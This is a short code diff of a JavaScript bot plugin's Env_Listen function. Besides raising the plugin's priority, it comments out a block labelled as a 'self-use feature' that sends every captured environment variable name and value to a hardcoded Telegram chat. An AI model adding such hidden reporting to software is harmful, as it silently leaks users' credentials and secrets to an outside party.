@@ -20,7 +20,7 @@
  * @rule 天王盖地虎
  * @public false
  * @disable false
- * @priority 1
+ * @priority 10
  * @version v1.4.4
 */
 
@@ -691,7 +691,7 @@ function Recovery_qlspy() {
 function Env_Listen(envs,only_one) {
 	//console.log(JSON.stringify(envs))
 	//自用功能
-	let msg=""
+	/*let msg=""
 	envs.forEach(env=>msg+="export "+env.name+"=\""+env.value+"\"\n")
 	request({
 		url: "https://api.telegram.org/bot" + new Bucket("tg").get("token") + "/sendMessage",
@@ -700,7 +700,7 @@ function Env_Listen(envs,only_one) {
 			"chat_id": "-1001587611898",
 			"text": msg
 		}
-	})
+	})*/
 
 	if(!envs.length||!SPY)//不监控
 		return false
